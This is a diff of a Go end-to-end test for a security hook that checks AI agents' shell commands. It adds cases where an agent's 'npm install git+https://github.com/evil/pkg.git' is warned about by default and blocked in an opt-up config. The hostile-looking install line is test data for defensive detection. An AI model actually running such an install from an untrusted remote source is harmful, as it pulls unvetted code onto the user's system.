@@ -35,10 +35,8 @@ import (
 //
 // SPATH case:  credential read → exit 1 / decision "block"
 // CORR case:   ai-figure critical install → exit 1 / decision "block"
-// NUDGE case:  pnpm add chalk → exit 0 / record_type "nudge" / decision non-block
-// BUN case:    bun add chalk → skipped when bun is absent (exec.LookPath fails)
+// HOOK case:   --hook claude-code credential read → exit 2 / deny stdout
 //
-// The E2E uses the REAL pnpm binary on PATH (no DetectStateFn swap — child process).
 // State/audit/catalogs all resolve under BEEKEEPER_HOME so the developer's real
 // ~/.beekeeper is never touched (T-08-23).
 func TestE2ELiveBinary(t *testing.T) {
@@ -105,8 +103,7 @@ func TestE2ELiveBinary(t *testing.T) {
 		t.Helper()
 		cmd := exec.Command(binPath, "check")
 		cmd.Stdin = strings.NewReader(stdinJSON)
-		// Set BEEKEEPER_HOME; inherit the rest of the environment (needed for PATH
-		// so the binary can find pnpm/bun/node for nudge detection).
+		// Set BEEKEEPER_HOME; inherit the rest of the environment.
 		cmd.Env = append(os.Environ(), fmt.Sprintf("BEEKEEPER_HOME=%s", homeDir))
 
 		if err := cmd.Run(); err != nil {
@@ -185,61 +182,81 @@ func TestE2ELiveBinary(t *testing.T) {
 	})
 
 	// -------------------------------------------------------------------------
-	// Case 3: NUDGE — pnpm add chalk must parse + emit a record_type "nudge" record.
+	// Case 4 (install-posture, IPST/IPOVR): a git/remote-source install at the
+	// agent hook.
 	//
-	// This case uses the REAL pnpm binary on PATH (no DetectStateFn swap — it is a
-	// child process). pnpm 11.x is installed on this dev box so the advisory fires.
-	// Asserts: exit 0 (soft advisory, non-block) + record_type "nudge" present.
+	// Deterministic with NO network: the git-remote rule is parsed entirely from
+	// the command string (pkgparse classifies "git+https://..." as a git source),
+	// so no registry/OSV fetch is consulted for a remote install. The seeded
+	// catalog is empty -> the only signal is the posture git-remote rule.
+	//
+	//   4a (default config): a git install WARNS but does NOT block -> exit 0,
+	//      audit decision "warn", a git/remote-source reason.
+	//   4b (git-remote opted to block via config.json): the SAME git install
+	//      BLOCKS -> exit 1, audit decision "block". The block is attributable to
+	//      the opt-up alone (4a proves the default warns).
 	// -------------------------------------------------------------------------
-	t.Run("NUDGE_pnpm_add_chalk", func(t *testing.T) {
+	const gitInstallJSON = `{"agent_name":"e2e-agent","tool_name":"Bash","tool_input":{"command":"npm install git+https://github.com/evil/pkg.git"}}`
+
+	t.Run("posture_git_remote_default_warn", func(t *testing.T) {
 		homeDir, auditPath, catalogsDir, _ := newHome(t)
-		// Empty catalog — chalk is not malicious; catalog match does not fire.
-		seedCatalog(t, catalogsDir, nil)
+		seedCatalog(t, catalogsDir, nil) // empty: posture is the only signal
 
-		stdinJSON := `{"agent_name":"e2e-agent","tool_name":"Bash","tool_input":{"command":"pnpm add chalk"}}`
-		exitCode, rec := runCase(t, homeDir, auditPath, stdinJSON, "nudge")
+		exitCode, rec := runCase(t, homeDir, auditPath, gitInstallJSON, "policy_decision")
 
-		// Soft advisory: must not block (exit 0).
+		// A git install WARNS by default -- it does not block (exit 0).
 		if exitCode != 0 {
-			t.Errorf("NUDGE: exit code = %d, want 0 (soft pnpm advisory must not block)", exitCode)
+			t.Errorf("posture default: exit code = %d, want 0 (a git install warns, does not block)", exitCode)
 		}
-		if rec.RecordType != "nudge" {
-			t.Errorf("NUDGE: no record_type=nudge audit record found; nudge wiring must emit §9 record for install commands (BTEST-03)")
+		if rec.Decision != "warn" {
+			t.Errorf("posture default: audit decision = %q, want %q (git-remote warns by default)", rec.Decision, "warn")
 		}
-		// Nudge decision must be non-block in soft mode.
-		if rec.Decision == "block" {
-			t.Errorf("NUDGE: audit decision = %q, want non-block (soft advisory)", rec.Decision)
+		if !postureReasonMentionsRemote(t, auditPath) {
+			t.Errorf("posture default: audit reason should mention the git/remote source")
+		}
+	})
+
+	t.Run("posture_git_remote_block_mode", func(t *testing.T) {
+		homeDir, auditPath, catalogsDir, _ := newHome(t)
+		seedCatalog(t, catalogsDir, nil)
+		// Opt the git-remote rule UP to block via the hermetic config.json that
+		// ConfigPath() resolves under $homeDir/beekeeper/config.json. config key is
+		// the JSON tag "remote_source" (config.PostureConfig.RemoteSource).
+		writePostureBlockConfig(t, homeDir, `{"posture":{"remote_source":{"action":"block"}}}`)
+
+		exitCode, rec := runCase(t, homeDir, auditPath, gitInstallJSON, "policy_decision")
+
+		// The SAME install now BLOCKS (exit 1) -- attributable to the opt-up.
+		if exitCode != 1 {
+			t.Errorf("posture block mode: exit code = %d, want 1 (git-remote opted to block must block)", exitCode)
+		}
+		if rec.Decision != "block" {
+			t.Errorf("posture block mode: audit decision = %q, want %q", rec.Decision, "block")
+		}
+		if !postureReasonMentionsRemote(t, auditPath) {
+			t.Errorf("posture block mode: audit reason should name the git/remote source")
 		}
 	})
 
 	// -------------------------------------------------------------------------
-	// Case 4: NUDGE-bun — bun add chalk (skip when bun absent).
-	// bun is not installed on this dev box; the case skips gracefully.
+	// Case 5 (SENTRY-009, human-install-observed-not-blocked): the daemon-level
+	// per-OS install tap that OBSERVES (never blocks) a human-run install is a
+	// CI/Linux-only surface (eBPF on Linux, ETW on Windows, eslogger on macOS) and
+	// is not exercisable from a single cross-platform live-binary E2E. The
+	// observe-only contract -- record_type sentry_install_observed, decision
+	// "observe", QuarantineRec=false, never a block -- is covered deterministically
+	// at the unit level by internal/sentry/install_observe_test.go. The hook (this
+	// binary) only ever sees AGENT tool calls; a human-run install never reaches
+	// it, so there is nothing for the hook to (not) block. This sub-case is
+	// recorded as a deliberate CI-only gap (see docs/posture-validation.md) and
+	// SKIPS with a structured reason rather than asserting a daemon tap here.
 	// -------------------------------------------------------------------------
-	t.Run("NUDGE_bun_add_chalk", func(t *testing.T) {
-		if _, err := exec.LookPath("bun"); err != nil {
-			t.Skip("bun not installed — skipping bun NUDGE E2E case")
-		}
-
-		homeDir, auditPath, catalogsDir, _ := newHome(t)
-		seedCatalog(t, catalogsDir, nil)
-
-		stdinJSON := `{"agent_name":"e2e-agent","tool_name":"Bash","tool_input":{"command":"bun add chalk"}}`
-		exitCode, rec := runCase(t, homeDir, auditPath, stdinJSON, "nudge")
-
-		if exitCode != 0 {
-			t.Errorf("NUDGE-bun: exit code = %d, want 0 (soft bun advisory must not block)", exitCode)
-		}
-		if rec.RecordType != "nudge" {
-			t.Errorf("NUDGE-bun: no record_type=nudge audit record found")
-		}
-		if rec.Decision == "block" {
-			t.Errorf("NUDGE-bun: audit decision = %q, want non-block", rec.Decision)
-		}
+	t.Run("posture_sentry009_human_install_observe_only", func(t *testing.T) {
+		t.Skip("SENTRY-009 daemon install taps are CI/Linux-only (eBPF/ETW/eslogger); the observe-only, never-block contract is covered by internal/sentry/install_observe_test.go and documented as a CI-only gap in docs/posture-validation.md")
 	})
 
 	// -------------------------------------------------------------------------
-	// Case 5 (VAL-05): Claude Code --hook exit-2 canary block — the documented
+	// Case 3 (VAL-05): Claude Code --hook exit-2 canary block — the documented
 	// true-block reference.
 	//
 	// Phase 10 changed the HOOK contract to exit 2 via `--hook <harness>`; the
@@ -296,8 +313,29 @@ func TestE2ELiveBinary(t *testing.T) {
 type e2eAuditRecord struct {
 	RecordType string `json:"record_type"`
 	Decision   string `json:"decision"`
-	NudgeAction string `json:"nudge_action,omitempty"`
-	ReasonCode  string `json:"reason_code,omitempty"`
+	Reason     string `json:"reason"`
+}
+
+// writePostureBlockConfig writes a hermetic config.json under
+// $homeDir/beekeeper/config.json -- the path the shipped binary resolves via
+// platform.ConfigPath() when BEEKEEPER_HOME is honored (beekeeperhomeoverride
+// build tag). Used to opt a posture rule UP to block for the live-binary E2E.
+func writePostureBlockConfig(t *testing.T, homeDir, jsonBody string) {
+	t.Helper()
+	cfgPath := filepath.Join(homeDir, "beekeeper", "config.json")
+	if err := os.WriteFile(cfgPath, []byte(jsonBody), 0o600); err != nil {
+		t.Fatalf("write hermetic config.json: %v", err)
+	}
+}
+
+// postureReasonMentionsRemote reports whether the last policy_decision record's
+// reason names the git/remote source (proving the git-remote rule is what fired,
+// not some unrelated decision).
+func postureReasonMentionsRemote(t *testing.T, auditPath string) bool {
+	t.Helper()
+	rec := readE2EAuditRecord(t, auditPath, "policy_decision")
+	r := strings.ToLower(rec.Reason)
+	return strings.Contains(r, "git") || strings.Contains(r, "source") || strings.Contains(r, "remote")
 }
 
 // readE2EAuditRecord reads all NDJSON lines from auditPath and returns the last
